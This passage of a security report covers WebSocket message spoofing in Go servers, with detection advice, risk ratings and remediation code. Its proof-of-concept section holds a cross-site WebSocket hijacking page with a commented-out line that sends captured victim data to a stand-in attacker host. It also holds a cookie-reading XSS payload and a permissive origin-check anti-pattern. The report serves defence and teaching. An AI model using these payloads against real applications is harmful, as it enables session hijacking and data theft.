- While generic Golang SAST tools, such as those built upon the `go/analysis` framework , might not have highly specific, pre-built rules for detecting nuanced WebSocket message spoofing logic, they can be valuable for identifying broader categories of weaknesses. These include patterns of unvalidated input being used in sensitive sinks (e.g., database queries, command execution) or improper handling of HTTP request properties that might be relevant during the handshake.

    
- Custom SAST rules or linters could potentially be developed to search for specific anti-patterns in Golang WebSocket code, such as the permissive `CheckOrigin` configuration (`func(r *http.Request) bool { return true }`) or common message handling functions that lack calls to validation routines.
- Tools like Apidog are mentioned for WebSocket testing and management , but they primarily function as dynamic testing or API interaction platforms rather than static analyzers of Go source code.

The detection of message spoofing vulnerabilities necessitates a **holistic testing strategy**. Code review is crucial for understanding the intended logic, identifying design flaws, and spotting insecure coding patterns (like a permissive `CheckOrigin`). Dynamic testing, using tools like Burp Suite, is then essential to confirm whether these potential flaws are practically exploitable (e.g., to achieve CSWSH or inject XSS). Relying on one method alone is often insufficient.

It is also important to recognize the **limitations of generic SAST for complex WebSocket logic**. Standard SAST tools may struggle with the custom application-level protocols and stateful nature often found in WebSocket message exchanges. For example, a generic tool might not understand the semantics of a message like `{"action":"deleteUser", "userId":123}` and therefore cannot determine if the currently connected user *should* be authorized to delete user 123 based on their roles or permissions. Such nuanced logic flaws often require security-aware manual code review by developers familiar with WebSocket-specific threats or more specialized, context-aware analysis tools.

## **10. Proof of Concept (PoC)**

To illustrate how WebSocket message spoofing vulnerabilities can be exploited, two Proof of Concept (PoC) scenarios are presented. These demonstrate both identity spoofing via CSWSH and content spoofing via XSS injection.

**PoC 1: CSWSH Leading to Message Spoofing (Identity Spoofing)**

- **Assumptions:**
    - The target Golang WebSocket server is accessible at `wss://vulnerable-app.com/ws`.
    - The application uses cookie-based authentication for user sessions.
    - The WebSocket upgrader in the Golang backend is misconfigured with a permissive `Origin` check, such as `CheckOrigin: func(r *http.Request) bool { return true }`.
- **Attacker's Malicious HTML Page (e.g., hosted on `https://evil-attacker.com/poc-cswsh.html`):**
    
    ```HTML
    
    <!DOCTYPE **html**>
    <html>
    <head>
        <title>CSWSH PoC</title>
    </head>
    <body>
        <h1>Please wait...</h1>
        <script>
            console.log("Attempting CSWSH attack...");
            // Target the vulnerable WebSocket endpoint
            var ws = new WebSocket("wss://vulnerable-app.com/ws");
    
            ws.onopen = function() {
                console.log("CSWSH: Connection successfully opened to wss://vulnerable-app.com/ws");
                // The connection is established using the victim's browser context and cookies.
                // The attacker can now send messages as if they are the victim.
    
                // Example: Spoofing a chat message as the victim
                var spoofedChatMessage = {
                    type: "chat_message",
                    channel_id: "general",
                    text: "This message is spoofed by an attacker via CSWSH!"
                };
                ws.send(JSON.stringify(spoofedChatMessage));
                console.log("CSWSH: Sent spoofed chat message as victim.");
    
                // Example: Attempting to trigger a sensitive action, like retrieving an API key
                // (assuming the application supports such an action via WebSocket)
                // var requestApiKeyMessage = {
                //     action: "GET_USER_API_KEY"
                // };
                // ws.send(JSON.stringify(requestApiKeyMessage));
                // console.log("CSWSH: Sent request for API key as victim.");
            };
    
            ws.onmessage = function(event) {
                // Attacker can receive messages intended for the victim and exfiltrate them
                console.log("CSWSH: Received message (as victim): " + event.data);
                // Example of exfiltrating received data to the attacker's server
                // var img = document.createElement('img');
                // img.src = 'https://evil-attacker.com/log?data=' + encodeURIComponent(btoa(event.data));
                // document.body.appendChild(img);
            };
    
            ws.onerror = function(error) {
                console.error("CSWSH: WebSocket Error: ", error);
            };
    
            ws.onclose = function(event) {
                console.log("CSWSH: WebSocket connection closed. Code: " + event.code + ", Reason: " + event.reason);
            };
        </script>
    </body>
    </html>
    ```
    
- **Exploitation Steps & Explanation:**
    1. The attacker tricks a victim, who is logged into `vulnerable-app.com`, into visiting `https://evil-attacker.com/poc-cswsh.html`.
    2. The JavaScript on the attacker's page attempts to establish a WebSocket connection to `wss://vulnerable-app.com/ws`.
    3. Because the victim is authenticated to `vulnerable-app.com`, their browser automatically includes the session cookies with the cross-origin WebSocket handshake request.
    4. Due to the permissive `CheckOrigin` on the server, the handshake succeeds.
    5. The attacker's script now has control over a WebSocket connection that is authenticated as the victim. It can send messages (e.g., post chat messages, attempt to trigger actions like "GET_USER_API_KEY") that the server will process as if they originated from the victim. Any responses from the server are also received by the attacker's script, allowing for potential data exfiltration. This demonstrates successful identity spoofing.
        

**PoC 2: XSS via WebSocket Message (Content Spoofing/Injection)**

- **Assumptions:**
    - The target Golang WebSocket server (e.g., a chat application at `ws://vulnerable-chat.com/chat`) receives messages and broadcasts them to other connected clients (or reflects them to the sender) without proper server-side input validation or client-side output encoding.
- **Attacker Action (using a WebSocket client tool like `wscat` 13 or Burp Suite Repeater's WebSocket functionality 34):**
    1. The attacker connects to the WebSocket endpoint:
    `wscat -c ws://vulnerable-chat.com/chat`
    2. Once connected, the attacker sends a specially crafted message containing an XSS payload. For example, if the chat messages are expected in JSON format:
    `>` `{"user":"attacker","message":"<img src=x onerror='alert(\"XSS via WebSocket: \" + document.domain + \" - cookie: \" + document.cookie);'>This is a benign-looking message."}`
    (This payload is similar to examples found in ).

        
- **Explanation:**
    1. The attacker establishes a legitimate (or hijacked, if combined with CSWSH) WebSocket connection.
    2. The attacker sends a message where the content (`message` field) includes a JavaScript payload.
    3. If the Golang server does not validate or sanitize this input before broadcasting it to other clients, or if the client-side JavaScript that renders chat messages does not properly encode this content before inserting it into the DOM, the `<img... onerror>` payload will execute in the browsers of all users receiving this message.
    4. This results in an alert box popping up, demonstrating XSS. More malicious payloads could steal cookies, redirect users, or perform other actions within the context of the vulnerable application's origin. This PoC demonstrates how the *content* of a message is spoofed to become malicious.

These Proof of Concepts illustrate that message spoofing is not merely a theoretical flaw but can lead to tangible and harmful impacts. The CSWSH PoC clearly demonstrates identity spoofing and the potential for unauthorized actions or data exfiltration by leveraging the victim's authenticated session. The XSS PoC shows how message content can be manipulated to execute arbitrary code on other clients' browsers, compromising their interaction with the application. Tools like Burp Suite are instrumental in crafting and testing such PoCs by allowing manipulation and replaying of WebSocket messages.

## **11. Risk Classification**

The risk associated with WebSocket message spoofing in Golang applications is determined by assessing the likelihood of exploitation and the potential impact of a successful attack.

- Likelihood: Medium to High
    
    The likelihood of exploitation varies depending on the specific vector:
    
    - **Common Mistakes:** The prevalence of common mistakes, such as missing or misconfigured `Origin` header validation and lack of server-side input validation, is relatively high in web development, including Golang applications. Tutorial code and rapid development practices can sometimes lead to these omissions.

        
    - **CSWSH:** Exploiting CSWSH typically requires user interaction, such as tricking a victim into visiting a malicious webpage. While this adds a step for the attacker, it is a feasible attack vector, especially for broad phishing campaigns or targeted attacks against users of a specific vulnerable application. The technical complexity for the attacker, given a vulnerable server, is low (AC:L in CVSS for many CSWSH CVEs ).
        

        
    - **Direct Message Injection:** If authentication or authorization mechanisms for WebSocket connections are weak or absent, an attacker might be able to directly connect and send spoofed messages with less complexity than CSWSH. This likelihood increases if endpoints are unauthenticated or if session tokens are easily compromised.
    Given these factors, the overall likelihood can range from Medium (for scenarios requiring specific user interaction against a well-defended target) to High (where common misconfigurations are present or authentication is weak).
- Impact: High to Critical
    
    The potential impact of successful WebSocket message spoofing is significant:
    
    - **Confidentiality:** Unauthorized access to sensitive data transmitted over WebSockets or retrieved via spoofed commands can lead to severe data breaches. This includes private messages, user credentials (if handled insecurely), API keys, or other proprietary information. If CSWSH leads to data exfiltration, the impact is high.
        
    - **Integrity:** Attackers can modify data on the server or data displayed to other users by sending spoofed messages. This can result in posting false information, executing unauthorized financial transactions, corrupting user profiles, or manipulating application state.

        
    - **Availability:** While not always the primary goal of spoofing, malformed messages can crash message handlers, or a flood of messages (potentially via hijacked connections) can overwhelm server resources, leading to Denial of Service (DoS) for legitimate users.
        
    - **Remote Code Execution (RCE):** In some scenarios, particularly if CSWSH is exploited against developer tools or applications with file system interaction capabilities via WebSockets, RCE might be possible, which represents a critical impact.

        
    - **Client-Side Impact (XSS):** Spoofed messages delivering XSS payloads can lead to full compromise of the victim's session with the application, credential theft, and further attacks originating from the victim's browser. CVSS scores for XSS can range from Medium (e.g., 6.1 ) to High (e.g., 8.5 ).
        

        
- Overall Risk:
    
    Combining a Medium to High likelihood with a High to Critical impact results in an overall risk assessment of High. Specific instances, such as those leading to RCE, would elevate the risk to Critical. The CVSS framework consistently assigns high scores (often 7.0 and above) to vulnerabilities like CSWSH and impactful XSS.1
    

A significant aspect contributing to the high risk is the **"stepping stone" nature of this vulnerability**. Message spoofing is often not the end goal but a means to achieve more severe attacks. For example, an XSS payload delivered via a spoofed WebSocket message can then be used to steal the victim's HTTP session cookies, allowing the attacker to hijack their entire session with the web application, not just the WebSocket portion. It could also be used to pivot attacks within the user's browser or internal network. This potential for escalation means the true risk often extends beyond the immediate consequence of a single spoofed message.

## **12. Fix & Patch Guidance**

Addressing WebSocket message spoofing vulnerabilities in Golang applications requires a defense-in-depth strategy, focusing on securing the handshake process, validating all message data, and implementing robust authentication and authorization.

- **A. Enforce Strict `Origin` Header Validation:**
    - **Guidance:** During the WebSocket handshake, the server must validate the `Origin` HTTP header against a pre-defined allowlist of trusted domains. This is a primary defense against Cross-Site WebSocket Hijacking (CSWSH). Requests from unknown or disallowed origins should be rejected.
        
    - **Golang `gorilla/websocket` Implementation:**
        
        ```Go
        
        import "net/url"
        
        var upgrader = websocket.Upgrader{
            CheckOrigin: func(r *http.Request) bool {
                origin := r.Header.Get("Origin")
                if origin == "" {
                    // Allow no origin for non-browser clients or same-origin requests
                    // depending on your security policy. For strict browser-only access from
                    // specific domains, you might choose to deny empty origins.
                    return true // Or false, based on policy
                }
                u, err := url.Parse(origin)
                if err!= nil {
                    return false // Malformed Origin header
                }
                // Replace "your-trusted-domain.com" with your actual domain(s)
                // For multiple domains, check against a list/map.
                // Be careful with subdomains; "*.your-trusted-domain.com" is too broad.
                // Prefer explicit listing: "app.your-trusted-domain.com", "api.your-trusted-domain.com"
                return u.Host == "your-trusted-domain.com" || u.Host == "sub.your-trusted-domain.com"
            },
        }
        ```

This example demonstrates checking the host from the parsed `Origin` header against an allowlist. It's crucial to handle potential errors from `url.Parse` and to be precise with domain matching (avoiding overly broad wildcards). **Golang `nhooyr.io/websocket` Implementation:

```go
opts := &websocket.AcceptOptions{

// Replace with your actual trusted domain(s)

OriginPatterns:string{"your-trusted-domain.com", "sub.your-trusted-domain.com"},

// InsecureSkipVerify should be false (default)

}

c, err := websocket.Accept(w, r, opts)

```

The OriginPatterns field uses filepath.Match for patterns, so ensure patterns are specific to avoid unintended matches.27

- **B. Implement Robust Server-Side Input Validation and Output Encoding:**
    - **Guidance:** Treat all data received via WebSocket messages as untrusted. Validate message structure, data types, lengths, and content against expected formats. Use schema validation (e.g., JSON Schema) for structured payloads like JSON or XML. Sanitize input rigorously to prevent injection attacks (XSS, SQLi, command injection). Any data sent back to clients, especially if it includes user-supplied content, must be appropriately encoded (e.g., HTML entity encoding for web display) to prevent XSS.

        
- **C. Strong Authentication for WebSocket Handshake:**
    - **Guidance:** Authenticate users *before* upgrading the HTTP connection to a WebSocket.

    - **Mechanisms:**
        - **Token-based authentication:** JWTs or opaque tokens are common. These can be passed during the handshake via:
            - A short-lived, single-use token in a query parameter (e.g., `wss://example.com/ws?ticket=TEMP_TOKEN`). The temporary token is obtained via a prior authenticated HTTP request. This mitigates risks of long-lived tokens in URLs.

            - The `Sec-WebSocket-Protocol` header can be used to "smuggle" a token, but this is a non-standard use and may have compatibility issues or still log the token.
                
        - **Cookie-based sessions:** If using cookies, they must be secured (HttpOnly, Secure, SameSite attributes). Crucially, this method **must be combined with CSRF token protection** for the WebSocket handshake to prevent CSWSH. The CSRF token should be validated by the server during the upgrade request.
            
- **D. Implement Per-Message Authorization:**
    - **Guidance:** After successful initial authentication at the handshake, for every subsequent WebSocket message that triggers a sensitive action or accesses restricted data, the server must verify that the authenticated user (associated with that specific `websocket.Conn`) has the necessary permissions for that operation. Do not assume handshake authentication implies authorization for all actions.
        
    - **Golang Implementation Concept:**
        1. During the authenticated handshake, retrieve the user's identity (e.g., user ID, roles, permissions) from the `http.Request` context or session.
        2. Associate this user context with the `websocket.Conn` object. This can be done by wrapping the connection in a custom struct that holds both the connection and the user information, or by using a concurrent-safe map keyed by the connection.
        3. In the message read loop (e.g., `readPump` or custom handler):
            - Parse the incoming message to determine the intended action and any parameters.
            - Retrieve the user context associated with the current connection.
            - Perform an authorization check: `if!currentUser.CanPerform(action, resource) { send_error_and_return; }`.
            - Proceed only if authorized.
- **E. Use Encrypted `wss://` (TLS) Exclusively:**
    - **Guidance:** Always use the `wss://` scheme for WebSocket connections. This encrypts the communication channel using TLS, protecting data in transit from eavesdropping and Man-in-the-Middle attacks. Configure the Golang HTTP server to use TLS certificates.

- **F. Implement CSRF Protection for Handshake (if using cookies):**
    - **Guidance:** As mentioned in authentication, if relying on cookie-based sessions, implement CSRF protection (e.g., synchronizer token pattern) for the WebSocket handshake. The server should generate a CSRF token, embed it in the page initiating the WebSocket, and the client script should send this token (e.g., as a query parameter or in a header if feasible) with the handshake request for server-side validation.
    
- **G. Rate Limiting and Resource Management:**
    - **Guidance:** Implement rate limiting on WebSocket connection attempts (per IP) and on the number of messages a client can send over a period to mitigate DoS attacks and prevent resource exhaustion.
        
    - Set reasonable limits on message size (e.g., using `conn.SetReadLimit()` in `gorilla/websocket` ) to prevent overly large messages from consuming excessive memory or processing time.

        

No single fix is sufficient for robust WebSocket security. A **defense-in-depth approach** is paramount, combining strong handshake security (Origin validation, authN, CSRF protection), ongoing message security (input validation, per-message authZ), and transport security (TLS via `wss://`). Each layer addresses different potential attack vectors that could lead to message spoofing.

For Golang library maintainers, considering **more secure defaults** (e.g., a stricter default `CheckOrigin` behavior or more prominent warnings for insecure configurations) could significantly improve baseline security. For developers, a thorough understanding of the security implications of chosen library configurations and WebSocket-specific threats is vital. The ease with which a permissive `CheckOrigin` can be set  suggests that developers might not always fully recognize the associated risk. Given that some widely used libraries like `gorilla/websocket` are now in an archived state , developers should carefully evaluate alternatives or community-maintained forks that prioritize ongoing security updates and best practices.

## **13. Scope and Impact**

Scope:

The vulnerability of message spoofing via WebSockets affects Golang applications that utilize this protocol without diligent implementation of essential security best practices. The primary points of failure reside in server-side components, specifically:

- The HTTP handlers responsible for upgrading connections to WebSockets, if they lack proper `Origin` validation or robust authentication.
- The message processing loops or goroutines that handle incoming WebSocket messages, if they do not perform adequate input validation and per-message authorization.

While the vulnerabilities originate on the server side, the impact is often experienced by:

- **Clients:** Web browsers of users can be subjected to XSS attacks, leading to session hijacking or data exposure. Other types of WebSocket clients (e.g., mobile or desktop applications) can also be affected if they improperly process spoofed messages from a compromised or malicious server.
- **Backend Systems:** Databases, microservices, or other backend infrastructure can be impacted if spoofed messages lead to unauthorized commands, data manipulation (e.g., via SQL injection), or excessive load.
- **The Application Itself:** The overall integrity, confidentiality, and availability of the application can be compromised.

Impact:

Successful exploitation of WebSocket message spoofing vulnerabilities can have severe and wide-ranging consequences:

- **Confidentiality Breach:**
    - Attackers may gain unauthorized access to sensitive data transmitted over WebSocket connections. This can occur if encryption (`wss://`) is missing, allowing MitM attacks, or if attackers can issue unauthorized data retrieval commands via spoofed messages (e.g., through CSWSH or by bypassing authorization).
        
    - Sensitive information such as private messages, user credentials (if handled insecurely), API keys, financial data, or other proprietary application data could be exposed. The Cable Haunt vulnerability, for instance, involved improper WebSocket usage leading to remote code execution and potential data access on cable modems.

        
- **Integrity Violation:**
    - Attackers can modify data in transit if `ws://` is used (MitM), or they can send spoofed messages that alter server-side data or data displayed to other users.
        
    - This can manifest as posting false or misleading information, executing unauthorized transactions (e.g., financial transfers, order placements), corrupting user profiles or application data, or manipulating application logic to the attacker's benefit.
- **Availability Disruption:**
    - Denial of Service (DoS) attacks can be launched by overwhelming the server with a high volume of WebSocket connection requests or messages, potentially from hijacked connections or numerous unauthenticated clients.
        
    - Sending malformed or excessively large messages can also crash improperly implemented message handlers or exhaust server resources (memory, CPU), leading to service unavailability for legitimate users.
- **Client-Side Attacks (Cross-Site Scripting - XSS):**
    - If spoofed messages containing malicious scripts (e.g., JavaScript) are delivered to and rendered by client browsers without proper sanitization, XSS attacks occur.
        
    - This can lead to hijacking of other users' sessions, theft of cookies or local storage data, arbitrary actions performed on behalf of the user within the application's context, UI redressing, and keylogging.
- **Unauthorized Account Access and Actions:**
    - If message spoofing allows an attacker to impersonate another user (typically via CSWSH or compromised session tokens), they can perform any action that the legitimate user is authorized for. This could include accessing private data, modifying settings, or initiating transactions.
- **Reputational Damage and Loss of Trust:**
    - Security incidents resulting from message spoofing can severely damage user trust in the application and the organization behind it. Public disclosure of such vulnerabilities can lead to significant reputational harm and potential financial losses.

A critical aspect of the impact is its potential for **cascading failures**. A single WebSocket message spoofing vulnerability can serve as an entry point for more extensive attacks. For example, spoofing a message to inject an XSS payload might allow an attacker to steal an administrator's session cookie. This cookie could then be used to gain privileged access to HTTP-based administrative interfaces of the application, leading to a complete system compromise. Similarly, a spoofed message that successfully executes an unauthorized command to add a new administrative user creates a persistent backdoor. The impact, therefore, is not always isolated to the immediate WebSocket interaction but can propagate through the application and associated systems. The CSWSH vulnerability in Vitest (CVE-2025-24964), for example, could lead to RCE by allowing an attacker to inject code into a test file and then trigger its execution, demonstrating a severe cascading effect.

The following table outlines the impact across different spoofing vectors:

| **Spoofing Vector** | **Impact on Confidentiality** | **Impact on Integrity** | **Impact on Availability** | **Example Scenario** |
| --- | --- | --- | --- | --- |
| XSS Injection via Message | High (e.g., cookie theft, sensitive data from DOM) | Medium (e.g., UI redressing, posting spoofed content via victim's session) | Low (unless XSS triggers client-side resource exhaustion) | Attacker sends `<script>...</script>` in a chat message, stealing other users' session cookies. |
| CSWSH-based Command Injection | High (e.g., retrieve victim's private data) | High (e.g., modify victim's data, perform actions as victim) | Medium (e.g., if actions exhaust resources) | Attacker uses CSWSH to send a message as victim to transfer funds or delete their account|
| Unauthorized Command (AuthZ Bypass) | Medium-High (depends on command; e.g., read restricted data) | High (e.g., modify system settings, create/delete data without permission) | Medium (if commands are resource-intensive) | Attacker, authenticated as a basic user, sends a message to trigger an admin-only function.  |
| MitM over `ws://` | Critical (all data in transit can be read) | Critical (all data in transit can be modified) | Medium (if messages are dropped or malformed) | Attacker on the same network intercepts and alters WebSocket messages containing financial data.  |

## **14. Remediation Recommendation**

A comprehensive remediation strategy is crucial to mitigate the risks associated with WebSocket message spoofing in Golang applications. This involves a multi-layered approach addressing security at the transport, handshake, and message processing levels.

**Prioritized Action Plan:**

1. **Immediate: Implement `wss://` (TLS) for All WebSocket Traffic.**
    - **Action:** Ensure all WebSocket connections are established using the secure `wss://` scheme. This encrypts data in transit, protecting against eavesdropping and Man-in-the-Middle (MitM) attacks.
    - **Golang Implementation Hint:** Configure the Golang HTTP server (e.g., `http.ListenAndServeTLS` or equivalent in web frameworks) with valid TLS certificates. Ensure clients connect using `wss://` URIs.
    - **Priority:** Critical. This is a foundational security measure.
        
2. **High Priority: Implement Strict `Origin` Header Validation.**
    - **Action:** On all WebSocket handshake endpoints, rigorously validate the `Origin` HTTP header against a strict allowlist of trusted source domains. Reject requests from unexpected or disallowed origins.
    - **Golang Implementation Hint:**
        - For `gorilla/websocket`: Implement the `Upgrader.CheckOrigin` function to perform this validation (see example in "Fix & Patch Guidance").
        - For `nhooyr.io/websocket`: Utilize `AcceptOptions.OriginPatterns` with specific, non-wildcard patterns and ensure `InsecureSkipVerify` is `false`.
    - **Priority:** High (Critical if using cookie-based authentication, as this is the primary defense against CSWSH ).
        
3. **High Priority: Implement Robust Server-Side Input Validation and Output Encoding.**
    - **Action:** Treat all data received via WebSocket messages as untrusted. Implement comprehensive server-side validation of message structure, data types, lengths, formats, and content against defined expectations. Sanitize input to prevent injection attacks (XSS, SQLi, etc.). Encode any user-supplied data sent back to clients to prevent XSS.
    - **Golang Implementation Hint:** Use validation libraries (e.g., for struct validation), regular expressions for pattern matching, and context-aware output encoding functions (e.g., `html/template` for HTML contexts).
    - **Priority:** High.

4. **High Priority: Enforce Strong Authentication for the WebSocket Handshake.**
    - **Action:** Ensure that only legitimate, authenticated users can establish WebSocket connections. Implement authentication checks *before* the HTTP connection is upgraded.
    - **Golang Implementation Hint:** Integrate with existing HTTP authentication middleware. For token-based auth, securely transmit and validate tokens (e.g., short-lived ticket in query param for handshake). For cookie-based auth, ensure cookies are secure (HttpOnly, Secure, SameSite) and combine with CSRF token protection.
    - **Priority:** High.
        
5. **Medium Priority: Implement Per-Message Authorization Checks.**
    - **Action:** Do not rely solely on handshake-level authentication. For every WebSocket message that triggers a sensitive action or accesses restricted data, verify that the authenticated user (associated with that connection) possesses the necessary permissions for that specific operation.
    - **Golang Implementation Hint:** Propagate user identity/roles (established during handshake) to the message handling goroutine (e.g., via a custom struct wrapping `websocket.Conn` or using `context.Context` carefully with goroutines). Check permissions against the action requested by the message.
    - **Priority:** Medium to High, depending on the sensitivity of actions handled via WebSockets.
        
6. **Medium Priority: Review and Harden Session Management.**
    - **Action:** If using cookie-based sessions, ensure cookies have appropriate security attributes (HttpOnly, Secure, SameSite=Strict or Lax). Implement and validate anti-CSRF tokens for the WebSocket handshake process to protect against CSWSH.
    - **Golang Implementation Hint:** Use Golang's `net/http` cookie functions to set attributes. Integrate CSRF token generation and validation libraries.
    - **Priority:** Medium (escalates to High if cookie auth is the primary method and `Origin` checks are weak).
        
**Supporting Actions:**

- **Code Review and Security Audits:**
    - Conduct regular, focused code reviews of Golang WebSocket handlers, specifically targeting common mistakes (permissive `CheckOrigin`, missing input validation, lack of per-message authorization).
    - Perform periodic penetration testing by security professionals, with a specific focus on WebSocket functionalities, including CSWSH, message injection, and authorization bypass attempts.
        
- **Developer Training:**
    - Educate developers on WebSocket-specific security risks, secure coding practices for Golang, and the correct usage of WebSocket libraries' security features. Understanding the threat model is key to writing secure code.
- **Dependency Management:**
    - Keep Golang WebSocket libraries (e.g., `gorilla/websocket`, `nhooyr.io/websocket`, or alternatives) and the Golang runtime itself updated to the latest stable versions to benefit from security patches.
        
    - Be aware of the maintenance status of libraries. For instance, `gorilla/websocket` is noted as being in an archived state , which means developers should carefully consider using actively maintained forks or alternative libraries for new projects or major refactors to ensure ongoing security support.

        
- **Monitoring and Logging:**
    - Implement detailed logging for WebSocket connection events (establishment, termination, errors), significant message exchanges (especially those triggering sensitive actions), and any detected security anomalies (e.g., failed origin checks, authorization failures). This aids in detecting and investigating suspicious activity.
        

Adopting a **proactive security stance** is more effective than merely reacting to incidents. This involves integrating security into the design phase (secure design patterns for WebSockets), performing continuous testing throughout the development lifecycle, and fostering developer awareness of WebSocket-specific threats. Many security resources provide preventative advice, emphasizing that secure WebSocket implementation is an ongoing responsibility.

The following checklist provides a structured approach to remediation:

| **Control Category** | **Specific Action** | **Golang Implementation Hint (Conceptual)** | **Priority** |
| --- | --- | --- | --- |
| Transport Security | Enforce `wss://` (TLS) for all connections. | Configure HTTP server for TLS (`ListenAndServeTLS`). | Critical |
| Handshake Security | Strict `Origin` header validation against an allowlist. | `gorilla/websocket.Upgrader.CheckOrigin`, `nhooyr.io/websocket.AcceptOptions.OriginPatterns`. | High |
| Handshake Security | Strong authentication before connection upgrade. | HTTP middleware for auth; pass user identity to WebSocket handler. | High |
| Handshake Security | CSRF token validation (if using cookie-based authentication). | Generate/validate anti-CSRF token during handshake. | High |
| Message Validation | Server-side validation of message structure, type, length, content. | Use struct tags for validation, schema validation libraries (e.g., JSON schema). | High |
| Message Validation | Sanitize input to prevent XSS, SQLi, etc. | Use appropriate sanitization libraries/functions based on context. | High |
| Message Validation | Contextual output encoding for data sent to clients. | `html/template` for HTML contexts. | High |
| Authorization | Per-message authorization checks for sensitive operations. | Associate user context with `websocket.Conn`; check permissions in message handler. | Medium |
| Resource Management | Rate limiting on connections and messages. | Implement counters per IP/user; use leaky bucket/token bucket algorithms. | Medium |
| Resource Management | Set reasonable message size limits. | `gorilla/websocket.Conn.SetReadLimit()`. | Medium |
| Dependency Management | Use actively maintained libraries; keep dependencies updated. | Regularly review `go.mod`; monitor for advisories. Consider alternatives to archived libraries. | Medium |
| Monitoring & Logging | Log connection events, errors, and suspicious activities. | Integrate with standard logging packages; send logs to a centralized system. | Medium |

## **15. Summary**

WebSocket message spoofing in Golang applications represents a significant and multifaceted vulnerability. It primarily arises from deficiencies in implementing fundamental security controls such as proper `Origin` header validation (often leading to Cross-Site WebSocket Hijacking - CSWSH), insufficient server-side input validation and output encoding for messages (enabling XSS and other injection attacks), and weak or missing authentication and authorization mechanisms, both at the handshake level and for individual messages.

The key risks associated with this vulnerability are severe, including the impersonation of legitimate users, execution of unauthorized actions on the server, client-side code execution (XSS) in other users' browsers, and breaches of data confidentiality and integrity. The real-time nature of WebSockets can amplify the impact of such attacks, allowing for immediate and potentially widespread consequences.

Core remediation strategies revolve around a defense-in-depth approach. This includes:

1. **Securing the Transport Layer:** Mandating the use of `wss://` (TLS) for all WebSocket communication.
2. **Hardening the Handshake:** Implementing strict `Origin` header validation, robust authentication mechanisms before connection upgrade, and CSRF protection if cookie-based sessions are used.
3. **Ensuring Message Integrity and Authorization:** Rigorously validating all incoming message content on the server-side, encoding any output sent to clients, and performing per-message authorization checks to ensure the authenticated user has the necessary permissions for the requested action.

It is crucial for developers working with WebSockets in Golang to understand that while libraries like `gorilla/websocket` and `nhooyr.io/websocket` provide the tools for WebSocket communication, the responsibility for secure implementation lies squarely with the application developer.**7** This includes correctly configuring library-provided security features (like `CheckOrigin` or `OriginPatterns`) and building application-specific logic for authentication, authorization, and input validation. A proactive approach to security, involving secure design principles, thorough code reviews, continuous testing, and developer education, is essential to mitigate the risks of WebSocket message spoofing and protect application users and data. Developers are urged to review their Golang WebSocket implementations against the guidelines provided in this report and prioritize the adoption of secure coding practices.
